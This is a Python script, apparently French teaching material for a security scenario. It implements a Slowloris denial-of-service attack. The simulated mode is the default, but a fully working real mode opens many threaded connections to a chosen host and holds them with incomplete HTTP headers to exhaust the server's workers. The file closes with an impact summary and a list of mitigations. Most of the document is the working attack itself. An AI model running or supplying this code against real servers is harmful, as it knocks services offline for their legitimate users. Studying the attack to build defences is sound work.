#!/usr/bin/env python3
"""
Scénario 5 : Slowloris Attack
EXPLOIT : Attaque DoS par connexions lentes

⚠️ USAGE PÉDAGOGIQUE UNIQUEMENT

Usage: python slowloris-attack.py --simulate
"""

import socket
import time
import threading
import random
import argparse
from typing import List, Dict
from dataclasses import dataclass, field


@dataclass
class SlowlorisConfig:
    """Configuration de l'attaque"""
    target_host: str = "127.0.0.1"
    target_port: int = 8583
    num_connections: int = 200
    keep_alive_interval: float = 10.0
    socket_timeout: float = 4.0
    simulate_only: bool = True


@dataclass
class AttackStats:
    """Statistiques de l'attaque"""
    connections_opened: int = 0
    connections_active: int = 0
    connections_failed: int = 0
    bytes_sent: int = 0
    duration_seconds: float = 0.0


class SlowlorisAttacker:
    """Implémentation de l'attaque Slowloris"""
    
    def __init__(self, config: SlowlorisConfig):
        self.config = config
        self.sockets: List[socket.socket] = []
        self.stats = AttackStats()
        self.running = False
        self.lock = threading.Lock()
    
    def create_socket(self) -> socket.socket:
        """Crée une socket vers la cible"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.config.socket_timeout)
        return s
    
    def create_http_header(self, partial: bool = True) -> str:
        """Génère un header HTTP incomplet"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)",
        ]
        
        header = f"GET /?{random.randint(1, 10000)} HTTP/1.1\r\n"
        header += f"Host: {self.config.target_host}\r\n"
        header += f"User-Agent: {random.choice(user_agents)}\r\n"
        header += "Accept-Language: en-US,en;q=0.5\r\n"
        header += "Accept-Encoding: gzip, deflate\r\n"
        
        # Ne PAS terminer avec \r\n\r\n (header incomplet)
        if not partial:
            header += "Connection: keep-alive\r\n\r\n"
        
        return header
    
    def send_keep_alive(self, sock: socket.socket) -> bool:
        """Envoie un header partiel pour maintenir la connexion"""
        try:
            # Envoyer un header additionnel partiel
            header = f"X-Custom-Header-{random.randint(1, 1000)}: "
            sock.send(header.encode())
            
            with self.lock:
                self.stats.bytes_sent += len(header)
            
            return True
        except Exception:
            return False
    
    def simulate_connection(self) -> Dict:
        """Simule une connexion (sans réseau réel)"""
        # Simulation du comportement
        time.sleep(random.uniform(0.01, 0.1))
        
        with self.lock:
            self.stats.connections_opened += 1
            self.stats.connections_active += 1
        
        return {
            "status": "simulated",
            "connection_id": self.stats.connections_opened
        }
    
    def attack_single_connection(self):
        """Gère une seule connexion d'attaque"""
        if self.config.simulate_only:
            self.simulate_connection()
            while self.running:
                time.sleep(self.config.keep_alive_interval)
                # Simuler le keep-alive
                with self.lock:
                    self.stats.bytes_sent += 30
            return
        
        try:
            sock = self.create_socket()
            sock.connect((self.config.target_host, self.config.target_port))
            
            with self.lock:
                self.sockets.append(sock)
                self.stats.connections_opened += 1
                self.stats.connections_active += 1
            
            # Envoyer le header initial incomplet
            header = self.create_http_header(partial=True)
            sock.send(header.encode())
            
            with self.lock:
                self.stats.bytes_sent += len(header)
            
            # Maintenir la connexion ouverte
            while self.running:
                time.sleep(self.config.keep_alive_interval)
                if not self.send_keep_alive(sock):
                    break
                    
        except Exception as e:
            with self.lock:
                self.stats.connections_failed += 1
        finally:
            with self.lock:
                self.stats.connections_active -= 1
    
    def start_attack(self, duration: float = 30.0):
        """Lance l'attaque"""
        print("\n" + "=" * 60)
        print("  🐌 SLOWLORIS ATTACK - Scénario 5")
        print("  ⚠️  USAGE STRICTEMENT PÉDAGOGIQUE")
        print("=" * 60)
        
        mode = "SIMULATION" if self.config.simulate_only else "RÉEL"
        print(f"\n📋 Configuration:")
        print(f"   Mode: {mode}")
        print(f"   Cible: {self.config.target_host}:{self.config.target_port}")
        print(f"   Connexions: {self.config.num_connections}")
        print(f"   Durée: {duration}s")
        
        self.running = True
        start_time = time.time()
        threads = []
        
        print(f"\n🚀 Ouverture de {self.config.num_connections} connexions lentes...")
        
        # Créer les connexions progressivement
        for i in range(self.config.num_connections):
            t = threading.Thread(target=self.attack_single_connection)
            t.daemon = True
            t.start()
            threads.append(t)
            
            # Afficher la progression
            if (i + 1) % 50 == 0:
                print(f"   {i + 1}/{self.config.num_connections} connexions ouvertes")
            
            time.sleep(0.05)  # Étalement des connexions
        
        print(f"\n⏳ Maintien des connexions pendant {duration}s...")
        
        # Attendre la durée spécifiée
        while time.time() - start_time < duration and self.running:
            time.sleep(1)
            elapsed = time.time() - start_time
            print(f"\r   Temps écoulé: {elapsed:.0f}s | Connexions actives: {self.stats.connections_active}", end="")
        
        # Arrêter l'attaque
        self.stop_attack()
        self.stats.duration_seconds = time.time() - start_time
        
        print("\n\n" + "=" * 60)
        print("  📊 STATISTIQUES")
        print("=" * 60)
        print(f"""
   Durée totale:        {self.stats.duration_seconds:.1f}s
   Connexions ouvertes: {self.stats.connections_opened}
   Connexions actives:  {self.stats.connections_active}
   Connexions échouées: {self.stats.connections_failed}
   Données envoyées:    {self.stats.bytes_sent} bytes
""")
        
        self.print_impact_analysis()
    
    def stop_attack(self):
        """Arrête l'attaque"""
        self.running = False
        
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        
        self.sockets.clear()
    
    def print_impact_analysis(self):
        """Affiche l'analyse d'impact"""
        print("-" * 60)
        print("  💥 ANALYSE D'IMPACT")
        print("-" * 60)
        print("""
  Slowloris exploite une faiblesse des serveurs HTTP:
  
  1. Chaque connexion occupe un thread/worker côté serveur
  2. Les headers incomplets maintiennent la connexion ouverte
  3. Le serveur attend la fin des headers (timeout long)
  4. Avec suffisamment de connexions, plus de workers disponibles
  5. Les clients légitimes ne peuvent plus se connecter
  
  ⚠️ IMPACT POTENTIEL:
  - Déni de service complet du serveur HTTP
  - Toutes les transactions bloquées
  - Pertes financières significatives
""")
        
        print("-" * 60)
        print("  💡 SOLUTIONS")
        print("-" * 60)
        print("""
  1. Limiter le nombre de connexions par IP
  2. Réduire le timeout des headers HTTP
  3. Utiliser un reverse proxy (nginx, HAProxy)
  4. Implémenter un WAF avec détection Slowloris
  5. Utiliser des serveurs async (non-bloquants)
  6. Configurer le rate limiting au niveau réseau
""")
        print("=" * 60 + "\n")


def main():
    parser = argparse.ArgumentParser(description="Slowloris Attack Simulator")
    parser.add_argument("--host", default="127.0.0.1", help="Target host")
    parser.add_argument("--port", type=int, default=8583, help="Target port")
    parser.add_argument("--connections", type=int, default=100, help="Number of connections")
    parser.add_argument("--duration", type=float, default=15.0, help="Attack duration")
    parser.add_argument("--simulate", action="store_true", default=True, help="Simulation mode")
    
    args = parser.parse_args()
    
    config = SlowlorisConfig(
        target_host=args.host,
        target_port=args.port,
        num_connections=args.connections,
        simulate_only=args.simulate
    )
    
    attacker = SlowlorisAttacker(config)
    
    try:
        attacker.start_attack(duration=args.duration)
    except KeyboardInterrupt:
        print("\n\n⏹ Attaque interrompue par l'utilisateur")
        attacker.stop_attack()


if __name__ == "__main__":
    main()
